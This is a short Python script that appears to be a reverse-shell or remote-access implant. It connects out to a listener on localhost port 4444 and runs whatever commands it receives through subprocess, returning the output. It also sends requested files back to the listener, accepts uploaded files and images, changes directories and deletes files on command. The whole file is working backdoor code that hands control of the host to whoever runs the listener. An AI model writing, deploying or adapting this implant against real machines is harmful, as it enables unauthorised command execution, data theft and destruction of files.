import socket
import subprocess
import os
import time

try:
    tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp.connect(('localhost', 4444))
except Exception as e:
    print(e)


class Server:

    def terminal(self, data):
        try:
            output = subprocess.check_output(data)
            tcp.send(output)
            tcp.send(b'\t')
        except Exception as e:
            # print("Error:", e)
            tcp.send(b"Please enter a valid command !!!\t")

    def directory(self, data):
        try:
            os.chdir(data[3:])
            tcp.send(b'Directory changed ...\t')
        except Exception as e:
            tcp.send(b' !!! Directory is empty\t')

    def upload_img(self, img_path):
        r_img = open(img_path, 'rb')
        image = r_img.read(2048)
        while image:
            tcp.send(image)
            image = r_img.read(2048)
        tcp.send(b'@@@@@')
        r_img.close()

    def download_img(self):
        final = b''
        while True:
            output = tcp.recv(1024)
            if not output:
                break
            final += output
            if b'@@@@@' in output:
                break
        fp = open('uploaded.jpg', 'wb')
        fp.write(final)

    def read(self, filename):
        if not filename:
            tcp.send(b"\/")
            tcp.send(b'\t')
        try:
            with open(filename, 'rb') as fp:
                tcp.send(fp.read())
                tcp.send(b'\t')
        except Exception as e:
            pass
            # print(e)

    def write(self):
        final = b''
        while True:
            output = tcp.recv(1024)
            if not output:
                break
            final += output
            if b'\t' in output:
                break
        fp = open('uploaded.txt', 'wb')
        fp.write(final)

    def main(self):
        while True:
            data = tcp.recv(1024).decode()
            if data == 'q':
                break

            elif data[0:12] == 'download_img':
                Server.upload_img(self, data[13:])

            elif data[0:8] == 'download':
                Server.read(self, data[9:])

            elif data[0:10] == 'upload_img':
                Server.download_img(self)

            elif data[0:6] == 'upload':
                Server.write(self)

            elif data[0:2] == 'cd':
                Server.directory(self, data)

            elif data[0:6] == 'delete':
                if not data[7:]:
                    time.sleep(1)
                    tcp.send(b'Empty filepath !!! \t')
                else:
                    try:
                        os.remove(data[7:])
                    except Exception as e:
                        time.sleep(1)
                        tcp.send(b'File not found \t')
                    else:
                        time.sleep(1)
                        tcp.send(b'File deleted...\t')

            elif data:
                Server.terminal(self, data)
            else:
                break


obj = Server()
obj.main()
